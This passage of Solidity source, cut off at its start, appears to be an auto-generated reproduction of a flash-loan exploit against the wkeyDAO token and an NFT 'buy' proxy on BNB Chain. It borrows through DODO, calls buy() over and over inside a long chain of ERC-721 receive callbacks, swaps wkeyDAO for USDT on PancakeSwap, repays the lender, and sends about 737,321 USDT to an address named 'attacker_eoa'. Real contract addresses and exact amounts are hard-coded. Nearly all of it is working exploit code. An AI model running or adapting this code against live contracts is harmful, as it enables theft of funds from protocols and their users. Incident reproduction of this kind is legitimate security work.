        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback129() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback130() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback131() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.DLP, 1200000000000000000000);
    }

    function flashCallback132() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback133() internal {
        {
            uint256 transferActionGraphAmount = 737321043501382964470008;
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        }
    }

    receive() external payable {}

    function wheeaappP(address arg0, uint256 amount, address arg2, address arg3, uint256 amount1, address arg5)
        external
        payable
    {
        arg0;
        amount;
        arg2;
        arg3;
        amount1;
        arg5;
        _runExploitPath();
        return;
    }

    function onERC721Received(address arg0, address arg1, uint256 amount, bytes calldata arg3) external payable {
        arg0;
        arg1;
        amount;
        arg3;
        uint256 callbackSequenceIndex = _nextDispatch(0x150b7a02);
        if (callbackSequenceIndex == 0) {
            if (!replayedCallback61) _nftCb60();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 1) {
            if (!replayedCallback42) _nftCb41();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 2) {
            if (!replayedCallback6) _nftCb5();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 3) {
            if (!replayedCallback12) _nftCb11();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 4) {
            if (!replayedCallback64) _nftCb63();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 5) {
            if (!replayedCallback46) _nftCb45();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 6) {
            if (!replayedCallback27) _nftCb26();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 7) {
            if (!replayedCallback50) _nftCb49();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 8) {
            if (!replayedCallback35) _nftCb34();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 9) {
            if (!replayedCallback14) _nftCb13();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 10) {
            if (!replayedCallback53) _nftCb52();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 11) {
            if (!replayedCallback16) _nftCb15();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 12) {
            if (!replayedCallback33) _nftCb32();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 13) {
            if (!replayedCallback65) _nftCb64();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 14) {
            if (!replayedCallback11) _nftCb10();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 15) {
            if (!replayedCallback19) _nftCb18();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 16) {
            if (!replayedCallback17) _nftCb16();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 17) {
            if (!replayedCallback3) _nftCb2();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 18) {
            if (!replayedCallback31) _nftCb30();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 19) {
            if (!replayedCallback52) _nftCb51();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 20) {
            if (!replayedCallback59) _nftCb58();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 21) {
            if (!replayedCallback56) _nftCb55();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 22) {
            if (!replayedCallback43) _nftCb42();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 23) {
            if (!replayedCallback25) _nftCb24();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 24) {
            if (!replayedCallback45) _nftCb44();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 25) {
            if (!replayedCallback40) _nftCb39();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 26) {
            if (!replayedCallback4) _nftCb3();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 27) {
            if (!replayedCallback26) _nftCb25();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 28) {
            if (!replayedCallback49) _nftCb48();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 29) {
            if (!replayedCallback41) _nftCb40();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 30) {
            if (!replayedCallback23) _nftCb22();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 31) {
            if (!replayedCallback54) _nftCb53();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 32) {
            if (!replayedCallback47) _nftCb46();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 33) {
            if (!replayedCallback30) _nftCb29();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 34) {
            if (!replayedCallback10) _nftCb9();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 35) {
            if (!replayedCallback7) _nftCb6();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 36) {
            if (!replayedCallback21) _nftCb20();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 37) {
            if (!replayedCallback37) _nftCb36();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 38) {
            if (!replayedCallback63) _nftCb62();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 39) {
            if (!replayedCallback2) _nftCb();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 40) {
            if (!replayedCallback51) _nftCb50();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 41) {
            if (!replayedCallback60) _nftCb59();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 42) {
            if (!replayedCallback5) _nftCb4();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 43) {
            if (!replayedCallback66) _nftCb65();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 44) {
            if (!replayedCallback13) _nftCb12();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 45) {
            if (!replayedCallback58) _nftCb57();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 46) {
            if (!replayedCallback57) _nftCb56();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 47) {
            if (!replayedCallback55) _nftCb54();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 48) {
            if (!replayedCallback68) _nftCb67();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 49) {
            if (!replayedCallback29) _nftCb28();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 50) {
            if (!replayedCallback67) _nftCb66();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 51) {
            if (!replayedCallback18) _nftCb17();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 52) {
            if (!replayedCallback28) _nftCb27();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 53) {
            if (!replayedCallback9) _nftCb8();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 54) {
            if (!replayedCallback22) _nftCb21();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 55) {
            if (!replayedCallback32) _nftCb31();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 56) {
            if (!replayedCallback36) _nftCb35();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 57) {
            if (!replayedCallback24) _nftCb23();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 58) {
            if (!replayedCallback20) _nftCb19();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 59) {
            if (!replayedCallback34) _nftCb33();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 60) {
            if (!replayedCallback8) _nftCb7();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 61) {
            if (!replayedCallback39) _nftCb38();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 62) {
            if (!replayedCallback62) _nftCb61();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 63) {
            if (!replayedCallback15) _nftCb14();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 64) {
            if (!replayedCallback38) _nftCb37();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 65) {
            if (!replayedCallback48) _nftCb47();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (callbackSequenceIndex == 66) {
            if (!replayedCallback44) _nftCb43();
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (!replayedCallback61) _nftCb60();
        bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function DVMFlashLoanCall(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        if (!replayedCallback69) flashCallback();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    bool private replayedCallback2;
    bool private replayedCallback3;
    bool private replayedCallback4;
    bool private replayedCallback5;
    bool private replayedCallback6;
    bool private replayedCallback7;
    bool private replayedCallback8;
    bool private replayedCallback9;
    bool private replayedCallback10;
    bool private replayedCallback11;
    bool private replayedCallback12;
    bool private replayedCallback13;
    bool private replayedCallback14;
    bool private replayedCallback15;
    bool private replayedCallback16;
    bool private replayedCallback17;
    bool private replayedCallback18;
    bool private replayedCallback19;
    bool private replayedCallback20;
    bool private replayedCallback21;
    bool private replayedCallback22;
    bool private replayedCallback23;
    bool private replayedCallback24;
    bool private replayedCallback25;
    bool private replayedCallback26;
    bool private replayedCallback27;
    bool private replayedCallback28;
    bool private replayedCallback29;
    bool private replayedCallback30;
    bool private replayedCallback31;
    bool private replayedCallback32;
    bool private replayedCallback33;
    bool private replayedCallback34;
    bool private replayedCallback35;
    bool private replayedCallback36;
    bool private replayedCallback37;
    bool private replayedCallback38;
    bool private replayedCallback39;
    bool private replayedCallback40;
    bool private replayedCallback41;
    bool private replayedCallback42;
    bool private replayedCallback43;
    bool private replayedCallback44;
    bool private replayedCallback45;
    bool private replayedCallback46;
    bool private replayedCallback47;
    bool private replayedCallback48;
    bool private replayedCallback49;
    bool private replayedCallback50;
    bool private replayedCallback51;
    bool private replayedCallback52;
    bool private replayedCallback53;
    bool private replayedCallback54;
    bool private replayedCallback55;
    bool private replayedCallback56;
    bool private replayedCallback57;
    bool private replayedCallback58;
    bool private replayedCallback59;
    bool private replayedCallback60;
    bool private replayedCallback61;
    bool private replayedCallback62;
    bool private replayedCallback63;
    bool private replayedCallback64;
    bool private replayedCallback65;
    bool private replayedCallback66;
    bool private replayedCallback67;
    bool private replayedCallback68;
    bool private replayedCallback69;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant DLP = 0x107F3Be24e3761A91322AA4f5F54D9f18981530C;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant wkeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
    address internal constant TransparentUpgradeableProxy_1E92D4 = 0x1E92d477473295E9f3B0f630f010b4EF8658dA94;
    address internal constant A_2F0F7F_1E43 = 0x2F0F7Fb20580aad8924Ff8Cdc6046be86D961E43;
    address internal constant attacker_eoa = 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32;
    address internal constant DODOFlashloan = 0x3783c91eE49A303c17C558F92bf8d6395d2f76E3;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant ASET = 0x591AAaDBc85e19065C88a1B0C2Ed3F58295f47Df;
    address internal constant Cake_LP = 0x8665A78ccC84D6Df2ACaA4b207d88c6Bc9b70Ec5;
    address internal constant A_9A32FA_29BF = 0x9a32Fa1f75cb9d32142164343d75ed5bA3d629Bf;
    address internal constant A_B63F6F_6CA7 = 0xB63F6Fe69dcAA4ec43903067ef2545EDCb4B6ca7;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WKNFT = 0xC1ee50b36305F3f28958617f82F4235224D97690;
    address internal constant A_CD6246_454D = 0xcD62464874EA7859ccEA96dFcFc0a067A2aB454d;
    address internal constant TransparentUpgradeableProxy_D51109 = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
    address internal constant A_F1988D_16A4 = 0xf1988dee95c442f5aF97c25B4b7dE4ce330816a4;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IDLP {
    function _BASE_TOKEN_() external view returns (uint256);
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface ITransparentUpgradeableProxy_D51109 {
    function buy() external;
}
